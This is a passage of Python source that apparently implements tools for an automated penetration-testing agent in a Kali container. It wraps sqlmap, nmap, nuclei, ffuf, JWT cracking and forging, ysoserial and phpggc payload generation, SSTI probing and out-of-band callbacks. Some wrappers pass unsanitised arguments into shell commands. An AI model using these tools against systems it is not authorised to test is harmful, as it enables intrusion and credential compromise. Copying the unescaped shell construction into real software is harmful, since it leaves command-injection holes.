            "printf 'hackingtool=/opt/hackingtool/hackingtool.py\\n'; "
            "else printf 'hackingtool=\\n'; fi"
        )
        result = _docker_exec(cmd, timeout=20)
        available: dict[str, str] = {}
        missing: list[str] = []
        for line in result.get("stdout", "").splitlines():
            if "=" not in line:
                continue
            name, path = line.split("=", 1)
            if path:
                available[name] = path
            else:
                missing.append(name)
        data["availability_check"] = {
            "exit_code": result.get("exit_code"),
            "available": available,
            "missing": missing,
            "stderr": result.get("stderr", ""),
        }

    return json.dumps(data, indent=2)


def read_file(path: str) -> str:
    """Read a file from inside the Kali container."""
    result = _docker_exec(f"cat '{path}'")
    if result["exit_code"] != 0:
        return json.dumps({
            "error": f"Failed to read file: {result['stderr']}",
            "exit_code": result["exit_code"],
        })
    return json.dumps({
        "content": result["stdout"],
        "path": path,
    })


def write_file(path: str, content: str) -> str:
    """Write content to a file inside the Kali container."""
    # Ensure parent directory exists
    dir_path = os.path.dirname(path)
    _docker_exec(f"mkdir -p '{dir_path}'")

    # Use heredoc to write content (handles special characters)
    # Escape single quotes in content for safe shell transmission
    escaped_content = content.replace("'", "'\\''")
    result = _docker_exec(f"printf '%s' '{escaped_content}' > '{path}'")

    if result["exit_code"] != 0:
        return json.dumps({
            "error": f"Failed to write file: {result['stderr']}",
            "exit_code": result["exit_code"],
        })
    return json.dumps({
        "status": "success",
        "path": path,
        "bytes_written": len(content),
    })


def list_dir(path: str = "/data") -> str:
    """List directory contents inside the Kali container."""
    result = _docker_exec(f"ls -lah '{path}' 2>&1")
    if result["exit_code"] != 0:
        return json.dumps({
            "error": f"Failed to list directory: {result['stderr']}",
            "exit_code": result["exit_code"],
        })
    return json.dumps({
        "path": path,
        "contents": result["stdout"],
    })


def http_request(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    data: str | None = None,
    follow_redirects: bool = True,
    insecure: bool = True,
    session: str | None = None,
) -> str:
    """
    Make an HTTP request using curl inside the container with persistent cookies.

    The `session` parameter selects which named auth session to use. If None,
    the registry's currently active session is used (default = legacy single
    cookie jar at /data/cookies/cookies.txt for backward compat).
    """
    sess = session_mod.get_registry().get(session)
    jar = sess.cookie_jar_path()

    # Merge static session headers with per-request headers (per-request wins).
    merged_headers: dict[str, str] = {}
    merged_headers.update(sess.static_headers or {})
    if headers:
        merged_headers.update(headers)

    cmd_parts = [
        "curl",
        "-s",
        "-S",
        "-D-",
        f"-b {jar}",
        f"-c {jar}",
        f"-X {method}",
    ]

    if follow_redirects:
        cmd_parts.append("-L")
    if insecure:
        cmd_parts.append("-k")

    for key, value in merged_headers.items():
        # Escape any single quotes in header values.
        v = str(value).replace("'", "'\\''")
        cmd_parts.append(f"-H '{key}: {v}'")

    if data:
        escaped_data = data.replace("'", "'\\''")
        cmd_parts.append(f"-d '{escaped_data}'")

    cmd_parts.append(f"'{url}'")

    curl_cmd = " ".join(cmd_parts)
    result = _docker_exec(curl_cmd, timeout=60)

    return json.dumps({
        "response": result["stdout"],
        "stderr": result["stderr"],
        "exit_code": result["exit_code"],
        "session": sess.name,
    }, indent=2)


# =============================================================================
# Headless Chromium Browser Functions (Playwright, in-container)
# =============================================================================

def browser_navigate(
    url: str,
    output_format: str = "html",
    wait_ms: int = 2000,
    session: str | None = None,
) -> str:
    """Navigate to a URL using headless Chromium (Playwright) in the container.

    Renders the page with a real browser engine, injects the active auth
    session's cookies/headers, and captures any alert()/confirm()/prompt()
    dialogs (XSS proof). Returns rendered content, final URL, status, title,
    and captured dialogs.
    """
    result = browser_mod.navigate(
        url, output_format=output_format, wait_ms=wait_ms, session=session,
    )
    return json.dumps({
        "rendered_content": result.get("content", ""),
        "format": "markdown" if output_format == "markdown" else "html",
        "url": url,
        "final_url": result.get("final_url", ""),
        "status": result.get("status"),
        "title": result.get("title", ""),
        "dialogs": result.get("dialogs", []),
        "xss_proof": result.get("xss_proof", ""),
        "console_errors": result.get("console_errors", []),
        "session": result.get("session", ""),
        "ok": result.get("ok", False),
        "error": result.get("error", ""),
    }, indent=2)


def browser_execute_js(
    url: str,
    script: str,
    wait_ms: int = 2000,
    session: str | None = None,
) -> str:
    """Execute JS on a Chromium-rendered page and return its evaluated value.

    Captures alert()/confirm()/prompt() dialogs as XSS proof.
    """
    result = browser_mod.execute_js(
        url, script=script, wait_ms=wait_ms, session=session,
    )
    return json.dumps({
        "js_result": result.get("js_result"),
        "script": script,
        "url": url,
        "final_url": result.get("final_url", ""),
        "status": result.get("status"),
        "title": result.get("title", ""),
        "dialogs": result.get("dialogs", []),
        "xss_proof": result.get("xss_proof", ""),
        "console_errors": result.get("console_errors", []),
        "session": result.get("session", ""),
        "ok": result.get("ok", False),
        "error": result.get("error", ""),
    }, indent=2)


def browser_interact(
    url: str,
    actions: list[dict],
    wait_ms: int = 2000,
    session: str | None = None,
) -> str:
    """Interact with a Chromium-rendered page via real CSS selectors.

    Supports click/type/select/submit/press. Injects the active auth session
    and captures any alert()/confirm()/prompt() dialogs (XSS proof).
    """
    result = browser_mod.interact(
        url, actions=actions, wait_ms=wait_ms, session=session,
    )
    return json.dumps({
        "rendered_content": result.get("content", ""),
        "actions_performed": result.get("actions_performed", actions),
        "url": url,
        "final_url": result.get("final_url", ""),
        "status": result.get("status"),
        "title": result.get("title", ""),
        "dialogs": result.get("dialogs", []),
        "xss_proof": result.get("xss_proof", ""),
        "console_errors": result.get("console_errors", []),
        "session": result.get("session", ""),
        "ok": result.get("ok", False),
        "error": result.get("error", ""),
    }, indent=2)


def analyze_response(response_body: str, payload: str = "") -> str:
    """
    Analyze an HTTP response using the ResponseAnalyzer.
    Returns structured security signals as JSON.
    """
    from hacking_agent.core.analyzer import ResponseAnalyzer
    analyzer = ResponseAnalyzer()
    signals = analyzer.analyze(
        response_text=response_body,
        payload=payload,
    )
    return json.dumps({
        "signals": signals,
        "formatted": analyzer.format_signals(signals),
    }, indent=2)


# =============================================================================
# Out-of-Band (Interactsh) Tool Implementations
# =============================================================================

def oob_get_domain(label: str = "") -> str:
    sess = oob.get_session()
    minted = sess.mint_domain(label=label)
    return json.dumps(minted, indent=2)


def oob_poll(token: str = "", timeout: int = 15,
             since_seconds: int | None = None) -> str:
    sess = oob.get_session()
    res = sess.poll(token=token, timeout=timeout, since_seconds=since_seconds)
    # Distill the agent-facing summary.
    summary_lines = []
    if not res.get("enabled"):
        summary_lines.append(f"OOB DISABLED: {res.get('error', 'unknown')}")
    elif res["matched"] == 0:
        summary_lines.append(f"No OOB callbacks (polled {res['polled_seconds']}s).")
    else:
        summary_lines.append(
            f"GOT {res['matched']} OOB callback(s) — blind vuln likely confirmed."
        )
        for i in res["interactions"][:8]:
            summary_lines.append(
                f"  [{i['protocol']}] from {i['remote_address']} "
                f"@ {i['timestamp']} id={i['full_id']}"
            )
    res["summary"] = "\n".join(summary_lines)
    return json.dumps(res, indent=2, default=str)


# =============================================================================
# Session Tool Implementations
# =============================================================================

def swap_session(name: str) -> str:
    reg = session_mod.get_registry()
    msg = reg.set_active(name)
    return json.dumps({
        "status": "ok" if not msg.startswith("ERROR") else "error",
        "message": msg,
        "active": reg.active().name,
        "active_role": reg.active().role_hint,
    }, indent=2)


def list_sessions() -> str:
    reg = session_mod.get_registry()
    return json.dumps(reg.describe(), indent=2)


# =============================================================================
# Differential Tool Implementations
# =============================================================================

def capture_baseline(name: str, url: str, method: str = "GET",
                     headers: dict | None = None, data: str | None = None,
                     session: str | None = None) -> str:
    """Send a request and store its response as a named baseline."""
    raw = http_request(
        url=url, method=method, headers=headers, data=data,
        follow_redirects=True, insecure=True, session=session,
    )
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        return json.dumps({"error": "internal: http_request output not JSON"})
    response_text = parsed.get("response", "")
    sess_name = parsed.get("session", "default")
    baseline = differ_mod.get_store().capture(
        name=name, raw_response=response_text, session_name=sess_name,
    )
    return json.dumps({
        "status": "captured",
        "baseline": baseline.to_dict(),
    }, indent=2, default=list)


def diff_against_baseline(baseline_name: str, url: str, method: str = "GET",
                          headers: dict | None = None, data: str | None = None,
                          session: str | None = None) -> str:
    """Send a request and compare its response to the named baseline."""
    raw = http_request(
        url=url, method=method, headers=headers, data=data,
        follow_redirects=True, insecure=True, session=session,
    )
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        return json.dumps({"error": "internal: http_request output not JSON"})
    response_text = parsed.get("response", "")
    diff = differ_mod.get_store().diff(baseline_name, response_text)
    diff["request_session"] = parsed.get("session", "default")
    return json.dumps(diff, indent=2, default=list)


# =============================================================================
# Recon Expansion Tools
# =============================================================================

def nuclei_scan(url: str, severity: str = "medium,high,critical",
                templates: str = "", rate_limit: int = 50) -> str:
    """Run a nuclei scan via the Kali container.

    Returns parsed findings only (not raw stdout) so the agent gets clean,
    actionable data. Empty result == no high-severity hits.
    """
    # nuclei is part of the projectdiscovery suite; expect it installed in Kali.
    avail = _docker_exec("which nuclei", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({
            "error": "nuclei not installed in container",
            "hint": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        })

    template_arg = ""
    if templates:
        # Allow tags=foo,bar OR a path.
        if templates.startswith("tags="):
            template_arg = f"-tags {templates[5:]}"
        else:
            template_arg = f"-t {templates}"

    # JSONL output, no banner, target via -u, limit findings to keep context small.
    cmd = (
        f"nuclei -u {url!r} -severity {severity!r} {template_arg} "
        f"-jsonl -silent -no-color -rate-limit {rate_limit} "
        f"-timeout 10 -retries 1 -duc -disable-update-check 2>/dev/null"
    )
    result = _docker_exec(cmd, timeout=600)
    findings: list[dict] = []
    for line in result["stdout"].splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = obj.get("info", {})
        findings.append({
            "template_id": obj.get("template-id"),
            "name": info.get("name"),
            "severity": info.get("severity"),
            "matched_at": obj.get("matched-at"),
            "cve": (info.get("classification", {}) or {}).get("cve-id"),
            "cwe": (info.get("classification", {}) or {}).get("cwe-id"),
            "description": (info.get("description") or "")[:300],
        })
    return json.dumps({
        "findings": findings,
        "count": len(findings),
        "severity_filter": severity,
        "exit_code": result["exit_code"],
    }, indent=2, default=str)


# Patterns for extracting endpoint-shaped strings from JS files.
_JS_ENDPOINT_PATTERNS = [
    re.compile(r'["\'`](/[a-zA-Z0-9_\-./]+(?:\?[^"\'`]*)?)["\'`]'),
    re.compile(r'["\'`](https?://[^"\'`\s]+)["\'`]'),
    re.compile(r'\.(?:get|post|put|delete|patch|head|options)\s*\(\s*["\'`]([^"\'`]+)["\'`]', re.IGNORECASE),
    re.compile(r'fetch\s*\(\s*["\'`]([^"\'`]+)["\'`]', re.IGNORECASE),
    re.compile(r'axios(?:\.\w+)?\s*\(\s*["\'`]([^"\'`]+)["\'`]', re.IGNORECASE),
    re.compile(r'url\s*[:=]\s*["\'`]([^"\'`]+)["\'`]', re.IGNORECASE),
    re.compile(r'["\'`](/api/[^"\'`\s]+)["\'`]'),
]
_JS_PARAM_PATTERN = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_-]{1,40})=')

# Filter out obvious noise (image paths, fonts, vendor maps).
_JS_ENDPOINT_BLOCKLIST = re.compile(
    r'\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|css|map|mp4|webp|webm)(\?|$)',
    re.IGNORECASE,
)


def extract_js_endpoints(url: str, max_files: int = 30) -> str:
    """Fetch the page, harvest <script src=...>, then mine each JS file.

    Returns deduplicated endpoints + parameter names with the JS file each
    came from.
    """
    # 1. Get the page itself.
    page_raw = http_request(url=url, method="GET")
    try:
        page = json.loads(page_raw)
        page_body = page.get("response", "")
    except json.JSONDecodeError:
        page_body = ""

    # Headers come first in the body via -D-; strip them.
    if "\r\n\r\n" in page_body:
        page_body = page_body.split("\r\n\r\n", 1)[1]
    elif "\n\n" in page_body:
        page_body = page_body.split("\n\n", 1)[1]

    # 2. Find script src URLs.
    src_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', page_body, re.IGNORECASE)
    # Inline scripts also count as sources.
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', page_body, re.IGNORECASE | re.DOTALL)

    from urllib.parse import urljoin, urlparse
    src_urls = [urljoin(url, s) for s in src_urls]
    src_urls = src_urls[:max_files]

    seen_endpoints: dict[str, list[str]] = {}
    seen_params: dict[str, list[str]] = {}

    def mine(text: str, source: str):
        for pat in _JS_ENDPOINT_PATTERNS:
            for m in pat.finditer(text):
                ep = m.group(1).strip()
                if not ep or len(ep) > 250:
                    continue
                if _JS_ENDPOINT_BLOCKLIST.search(ep):
                    continue
                if ep.startswith(("data:", "javascript:", "mailto:", "tel:", "blob:")):
                    continue
                seen_endpoints.setdefault(ep, [])
                if source not in seen_endpoints[ep]:
                    seen_endpoints[ep].append(source)
        for m in _JS_PARAM_PATTERN.finditer(text):
            p = m.group(1)
            seen_params.setdefault(p, [])
            if source not in seen_params[p]:
                seen_params[p].append(source)

    # 3. Mine inline scripts first.
    for i, script_body in enumerate(inline_scripts):
        if script_body.strip():
            mine(script_body, source=f"inline_script_{i}")

    # 4. Fetch + mine each external JS file.
    fetched_files: list[dict] = []
    for src in src_urls:
        host_in_scope = urlparse(src).hostname == urlparse(url).hostname
        # Same-origin only by default — third-party CDN scripts rarely have
        # endpoints we can hit, and pulling them is just noise.
        if not host_in_scope:
            fetched_files.append({"url": src, "skipped": "cross-origin"})
            continue
        raw = http_request(url=src, method="GET")
        try:
            body = json.loads(raw).get("response", "")
        except json.JSONDecodeError:
            body = ""
        if "\r\n\r\n" in body:
            body = body.split("\r\n\r\n", 1)[1]
        elif "\n\n" in body:
            body = body.split("\n\n", 1)[1]
        mine(body, source=src)
        fetched_files.append({"url": src, "bytes": len(body)})

    # Order endpoints by how many sources reference them (popularity = signal).
    ordered_eps = sorted(
        seen_endpoints.items(),
        key=lambda kv: (-len(kv[1]), kv[0]),
    )
    return json.dumps({
        "page_url": url,
        "fetched_files": fetched_files[:max_files],
        "endpoint_candidates": [
            {"endpoint": ep, "sources": srcs}
            for ep, srcs in ordered_eps[:200]
        ],
        "parameter_candidates": sorted(seen_params.keys())[:200],
        "endpoint_count": len(seen_endpoints),
        "parameter_count": len(seen_params),
    }, indent=2)


_API_DISCOVERY_PATHS = [
    "/openapi.json", "/openapi.yaml", "/openapi", "/swagger.json",
    "/swagger.yaml", "/swagger-ui", "/swagger-ui.html", "/swagger/index.html",
    "/api-docs", "/api/docs", "/api/swagger.json", "/v1/swagger.json",
    "/v2/api-docs", "/v3/api-docs",
    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
    "/.well-known/openid-configuration", "/.well-known/security.txt",
    "/.well-known/oauth-authorization-server",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/_ah/api/explorer", "/wp-json", "/wp-json/wp/v2/users",
]

_GRAPHQL_INTROSPECTION = (
    '{"query":"query IntrospectionQuery{__schema{queryType{name} '
    'mutationType{name} types{name kind description fields{name '
    'description type{name kind ofType{name kind}}}}}}"}'
)


def discover_apis(base_url: str) -> str:
    """Probe a curated list of API/discovery endpoints.

    For /graphql variants, also send an introspection query so the agent can
    immediately see the schema (or know it's locked down).
    """
    from urllib.parse import urljoin
    base = base_url.rstrip("/") + "/"
    results: list[dict] = []
    graphql_introspection_findings: list[dict] = []

    for path in _API_DISCOVERY_PATHS:
        target = urljoin(base, path.lstrip("/"))
        raw = http_request(url=target, method="GET")
        try:
            parsed = json.loads(raw)
            response = parsed.get("response", "")
        except json.JSONDecodeError:
            response = ""

        # Pull status from the curl headers (-D- prefix).
        status = 0
        first_line = response.split("\n", 1)[0] if response else ""
        m = re.match(r"HTTP/[\d.]+\s+(\d+)", first_line)
        if m:
            status = int(m.group(1))

        # Trim body for the snippet.
        snippet_start = response
        if "\r\n\r\n" in snippet_start:
            snippet_start = snippet_start.split("\r\n\r\n", 1)[1]
        elif "\n\n" in snippet_start:
            snippet_start = snippet_start.split("\n\n", 1)[1]

        results.append({
            "path": path,
            "url": target,
            "status": status,
            "interesting": status not in (0, 404, 403, 401),
            "snippet": snippet_start[:400].replace("\n", " ").strip(),
        })

        # If a GraphQL endpoint is reachable, attempt introspection.
        if "graphql" in path and status and status < 500:
            intro_raw = http_request(
                url=target, method="POST",
                headers={"Content-Type": "application/json"},
                data=_GRAPHQL_INTROSPECTION,
            )
            try:
                intro_response = json.loads(intro_raw).get("response", "")
            except json.JSONDecodeError:
                intro_response = ""
            graphql_introspection_findings.append({
                "url": target,
                "introspection_enabled": (
                    "__schema" in intro_response
                    and "errors" not in intro_response.lower()[:200]
                ),
                "snippet": intro_response[-500:][:500],
            })

    return json.dumps({
        "base_url": base_url,
        "probes": results,
        "graphql_introspection": graphql_introspection_findings,
        "interesting_paths": [r for r in results if r["interesting"]],
    }, indent=2)


# =============================================================================
# Automatic Tool-Selection Tool
# =============================================================================

def recommend_tools(vuln_class: str = "", phase: str = "",
                    tech: str = "") -> str:
    """Return a deterministic ranked shortlist of tools for the context."""
    tech_val: str | list[str] = tech
    if isinstance(tech, str) and "," in tech:
        tech_val = [t.strip() for t in tech.split(",") if t.strip()]
    available = list(TOOL_FUNCTIONS.keys())
    ranked = tool_selector_mod.rank_tools(
        vuln_class=vuln_class or None,
        phase=phase or None,
        tech=tech_val or None,
        available_tools=available,
    )
    return json.dumps({
        "vuln_class": vuln_class,
        "phase": tool_selector_mod.normalize_phase(phase),
        "tech": tech,
        "recommendations": ranked[:10],
        "rendered": tool_selector_mod.render_recommendations(
            vuln_class or None, phase or None, tech_val or None, available,
        ),
    }, indent=2)


# =============================================================================
# Structured Scanner Wrappers (parsed into KG-ready records)
# =============================================================================

def ffuf_fuzz(url: str, wordlist: str = "", match_codes: str = "",
              extra_args: str = "", timeout: int = 300) -> str:
    """Run ffuf and return structured endpoint records parsed from its JSON."""
    avail = _docker_exec("command -v ffuf", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "ffuf not installed in container",
                            "hint": "go install github.com/ffuf/ffuf/v2@latest"})
    wl = wordlist or "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
    mc = match_codes or "200,204,301,302,307,401,403"
    out_path = "/tmp/reynard_ffuf.json"
    cmd = (
        f"ffuf -u {shlex.quote(url)} -w {shlex.quote(wl)} "
        f"-mc {shlex.quote(mc)} -of json -o {out_path} -s "
        f"{extra_args} >/dev/null 2>&1; cat {out_path} 2>/dev/null"
    )
    result = _docker_exec(cmd, timeout=timeout)
    records = parsers_mod.parse_ffuf(result.get("stdout", ""))
    return json.dumps({
        "summary": records["summary"],
        "kg_records": records,
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def sqlmap_run(url: str, data: str = "", extra_args: str = "",
               level: int = 2, risk: int = 1, timeout: int = 600) -> str:
    """Run sqlmap non-interactively and return structured injection records."""
    avail = _docker_exec("command -v sqlmap", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "sqlmap not installed in container"})
    parts = [
        "sqlmap", "-u", shlex.quote(url), "--batch",
        f"--level={int(level)}", f"--risk={int(risk)}",
    ]
    if data:
        parts += ["--data", shlex.quote(data)]
    cmd = " ".join(parts) + (f" {extra_args}" if extra_args else "") + " 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    records = parsers_mod.parse_sqlmap(result.get("stdout", ""), url=url)
    return json.dumps({
        "summary": records["summary"],
        "kg_records": records,
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def nmap_scan(target: str, ports: str = "", extra_args: str = "",
              timeout: int = 600) -> str:
    """Run an nmap -sV scan (XML) and return structured service records."""
    avail = _docker_exec("command -v nmap", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "nmap not installed in container"})
    port_arg = f"-p {shlex.quote(ports)} " if ports else ""
    cmd = (
        f"nmap -sV -oX - {port_arg}{extra_args} {shlex.quote(target)} 2>/dev/null"
    )
    result = _docker_exec(cmd, timeout=timeout)
    records = parsers_mod.parse_nmap(result.get("stdout", ""))
    return json.dumps({
        "summary": records["summary"],
        "kg_records": records,
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


# =============================================================================
# OSINT / external recon (Shodan/Censys clients live in integrations/shodan.py;
# dns_recon + tls_info run dependency-light tools inside the container)
# =============================================================================

def dns_recon(domain: str, record_types: str = "", timeout: int = 60) -> str:
    """Resolve DNS records for a domain (dnsx preferred, else host/dig)."""
    types = [t.strip().lower() for t in (record_types or "a,aaaa,cname,mx,ns,txt").split(",") if t.strip()]
    host = urlparse(domain if "://" in domain else f"http://{domain}").hostname or domain
    have_dnsx = _docker_exec("command -v dnsx", timeout=5).get("exit_code", -1) == 0
    have_host = _docker_exec("command -v host", timeout=5).get("exit_code", -1) == 0
    have_dig = _docker_exec("command -v dig", timeout=5).get("exit_code", -1) == 0
    if not (have_dnsx or have_host or have_dig):
        return json.dumps({"error": "no DNS tool (dnsx/host/dig) available in container"})

    records: dict[str, list[str]] = {}
    for rtype in types:
        if have_dnsx:
            cmd = f"dnsx -silent -{rtype} -resp-only -d {shlex.quote(host)} 2>/dev/null"
        elif have_host:
            cmd = f"host -t {shlex.quote(rtype)} {shlex.quote(host)} 2>/dev/null"
        else:
            cmd = f"dig +short {shlex.quote(rtype)} {shlex.quote(host)} 2>/dev/null"
        out = _docker_exec(cmd, timeout=timeout).get("stdout", "")
        values = [line.strip() for line in out.splitlines() if line.strip()]
        if values:
            records[rtype] = values

    kg = {
        "source": "dns_recon",
        "endpoints": [], "parameters": [], "services": [],
        "findings": [],
        "summary": f"dns_recon {host}: {sum(len(v) for v in records.values())} record(s)",
    }
    return json.dumps({
        "domain": host,
        "records": records,
        "summary": kg["summary"],
        "kg_records": kg,
    }, indent=2, default=str)


def tls_info(target: str, timeout: int = 120) -> str:
    """Enumerate TLS/SSL config for a host using sslscan (fallback testssl.sh)."""
    host = target
    if "://" in target:
        parsed = urlparse(target)
        host = parsed.hostname or target
        if parsed.port:
            host = f"{host}:{parsed.port}"
    have_sslscan = _docker_exec("command -v sslscan", timeout=5).get("exit_code", -1) == 0
    have_testssl = _docker_exec("command -v testssl.sh", timeout=5).get("exit_code", -1) == 0
    if have_sslscan:
        tool = "sslscan"
        cmd = f"sslscan --no-colour {shlex.quote(host)} 2>&1"
    elif have_testssl:
        tool = "testssl.sh"
        cmd = f"testssl.sh --color 0 --quiet {shlex.quote(host)} 2>&1"
    else:
        return json.dumps({"error": "neither sslscan nor testssl.sh available in container"})
    result = _docker_exec(cmd, timeout=timeout)
    return json.dumps({
        "target": host,
        "tool": tool,
        "output": result.get("stdout", ""),
        "exit_code": result.get("exit_code"),
        "summary": f"tls_info {host}: scanned with {tool}",
    }, indent=2, default=str)


# =============================================================================
# Class-specific OSS tools (JWT / deserialization / SSTI) — run in-container
# =============================================================================

def _resolve_jwt_tool() -> str | None:
    """Return an invokable jwt_tool command, or None if not installed."""
    if _docker_exec("command -v jwt_tool", timeout=5).get("exit_code", -1) == 0:
        return "jwt_tool"
    for path in ("/opt/jwt_tool/jwt_tool.py", "/usr/share/jwt_tool/jwt_tool.py"):
        if _docker_exec(f"test -f {shlex.quote(path)}", timeout=5).get("exit_code", -1) == 0:
            return f"python3 {path}"
    return None


def jwt_tool(token: str, mode: str = "scan", exploit: str = "",
             wordlist: str = "", extra_args: str = "", timeout: int = 180) -> str:
    """Run jwt_tool against a JWT for analysis/cracking/exploitation."""
    binary = _resolve_jwt_tool()
    if not binary:
        return json.dumps({"error": "jwt_tool not installed in container",
                           "hint": "add jwt_tool to the Dockerfile"})
    base = f"{binary} {shlex.quote(token)}"
    if mode == "crack":
        wl = wordlist or "/usr/share/wordlists/rockyou.txt"
        cmd = f"{base} -C -d {shlex.quote(wl)}"
    elif mode == "exploit":
        code = exploit or "a"
        cmd = f"{base} -X {shlex.quote(code)}"
    elif mode == "tamper":
        cmd = f"{base} -T"
    else:
        cmd = base
    if extra_args:
        cmd += f" {extra_args}"
    cmd += " 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    stdout = result.get("stdout", "")
    findings: list[dict[str, Any]] = []
    lowered = stdout.lower()
    if mode == "crack" and ("found" in lowered and "secret" in lowered):
        findings.append({
            "type": "JWT weak secret", "severity": "high",
            "name": "jwt_tool cracked HMAC secret", "matched_at": "",
            "detail": stdout[-400:],
        })
    if any(sig in lowered for sig in ("alg:none", "alg-none", "successfully", "forged")):
        findings.append({
            "type": "JWT tampering", "severity": "high",
            "name": f"jwt_tool {mode} produced a candidate forged token",
            "matched_at": "", "detail": stdout[-400:],
        })
    kg = {
        "source": "jwt_tool", "endpoints": [], "parameters": [],
        "services": [], "findings": findings,
        "summary": f"jwt_tool {mode}: {len(findings)} finding(s)",
    }
    return json.dumps({
        "mode": mode,
        "output": stdout,
        "exit_code": result.get("exit_code"),
        "summary": kg["summary"],
        "kg_records": kg,
    }, indent=2, default=str)


def ysoserial_gen(gadget: str, command: str, encode: bool = True,
                  timeout: int = 120) -> str:
    """Generate a Java deserialization payload with ysoserial."""
    have_java = _docker_exec("command -v java", timeout=5).get("exit_code", -1) == 0
    jar = ""
    for path in ("/opt/ysoserial/ysoserial.jar", "/usr/share/ysoserial/ysoserial.jar",
                 "/opt/ysoserial.jar"):
        if _docker_exec(f"test -f {shlex.quote(path)}", timeout=5).get("exit_code", -1) == 0:
            jar = path
            break
    if not have_java:
        return json.dumps({"error": "java not installed in container (ysoserial needs a JRE)"})
    if not jar:
        return json.dumps({"error": "ysoserial.jar not found in container",
                           "hint": "add ysoserial to the Dockerfile"})
    gen = f"java -jar {shlex.quote(jar)} {shlex.quote(gadget)} {shlex.quote(command)}"
    if encode:
        cmd = f"{gen} 2>/dev/null | base64 -w0"
    else:
        cmd = f"{gen} 2>/dev/null | xxd -p | tr -d '\\n'"
    result = _docker_exec(cmd, timeout=timeout)
    payload = result.get("stdout", "").strip()
    ok = bool(payload) and result.get("exit_code") == 0
    return json.dumps({
        "gadget": gadget,
        "command": command,
        "encoding": "base64" if encode else "hex",
        "payload": payload,
        "exit_code": result.get("exit_code"),
        "summary": (f"ysoserial {gadget}: generated {len(payload)} char payload"
                    if ok else f"ysoserial {gadget}: generation failed"),
    }, indent=2, default=str)


def phpggc_gen(chain: str, command: str, encoding: str = "none",
               extra_args: str = "", timeout: int = 120) -> str:
    """Generate a PHP gadget-chain payload with phpggc."""
    binary = ""
    if _docker_exec("command -v phpggc", timeout=5).get("exit_code", -1) == 0:
        binary = "phpggc"
    elif _docker_exec("test -f /opt/phpggc/phpggc", timeout=5).get("exit_code", -1) == 0:
        binary = "/opt/phpggc/phpggc"
    if not binary:
        return json.dumps({"error": "phpggc not installed in container",
                           "hint": "add phpggc to the Dockerfile"})
    enc_flag = {"base64": "-b", "url": "-u", "urlencode": "-u"}.get(encoding, "")
    parts = [binary]
    if enc_flag:
        parts.append(enc_flag)
    if extra_args:
        parts.append(extra_args)
    parts += [shlex.quote(chain), shlex.quote(command)]
    cmd = " ".join(parts) + " 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    payload = result.get("stdout", "").strip()
    ok = bool(payload) and result.get("exit_code") == 0
    return json.dumps({
        "chain": chain,
        "command": command,
        "encoding": encoding,
        "payload": payload,
        "exit_code": result.get("exit_code"),
        "summary": (f"phpggc {chain}: generated {len(payload)} char payload"
                    if ok else f"phpggc {chain}: generation failed"),
    }, indent=2, default=str)


def ssti_probe(url: str, data: str = "", extra_args: str = "",
               timeout: int = 300) -> str:
    """Probe for server-side template injection with tplmap (fallback sstimap)."""
    if _docker_exec("command -v tplmap", timeout=5).get("exit_code", -1) == 0:
        tool = "tplmap"
        base = f"tplmap -u {shlex.quote(url)}"
    elif _docker_exec("test -f /opt/tplmap/tplmap.py", timeout=5).get("exit_code", -1) == 0:
        tool = "tplmap"
        base = f"python3 /opt/tplmap/tplmap.py -u {shlex.quote(url)}"
    elif _docker_exec("command -v sstimap", timeout=5).get("exit_code", -1) == 0:
        tool = "sstimap"
        base = f"sstimap -u {shlex.quote(url)}"
    elif _docker_exec("test -f /opt/sstimap/sstimap.py", timeout=5).get("exit_code", -1) == 0:
        tool = "sstimap"
        base = f"python3 /opt/sstimap/sstimap.py -u {shlex.quote(url)}"
    else:
        return json.dumps({"error": "neither tplmap nor sstimap available in container",
                           "hint": "add tplmap or sstimap to the Dockerfile"})
    cmd = base
    if data:
        cmd += f" -d {shlex.quote(data)}"
    if extra_args:
        cmd += f" {extra_args}"
    cmd += " 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    stdout = result.get("stdout", "")
    engine = ""
    m = re.search(r"[Tt]emplate engine:\s*([A-Za-z0-9_.\-]+)", stdout)
    if m:
        engine = m.group(1)
    findings: list[dict[str, Any]] = []
    if engine or "injection" in stdout.lower() and "found" in stdout.lower():
        findings.append({
            "type": "Server-side template injection", "severity": "high",
            "name": f"SSTI detected ({engine or 'engine unknown'})",
            "matched_at": url, "detail": stdout[-400:],
        })
    kg = {
        "source": "ssti_probe", "endpoints": [], "parameters": [],
        "services": [], "findings": findings,
        "summary": f"ssti_probe: engine={engine or 'none detected'}",
    }
    return json.dumps({
        "tool": tool,
        "engine": engine,
        "output": stdout,
        "exit_code": result.get("exit_code"),
        "summary": kg["summary"],
        "kg_records": kg,
    }, indent=2, default=str)


# =============================================================================
# Session Registration Tool
# =============================================================================

def register_session(name: str, role_hint: str = "unknown",
                     cookies: dict | None = None, cookie_domain: str = "",
                     cookie_header: str = "", static_headers: dict | None = None,
                     set_active: bool = False) -> str:
    reg = session_mod.get_registry()
    msg = reg.register_session(
        name=name,
        role_hint=role_hint,
        static_headers=static_headers,
        cookies=cookies,
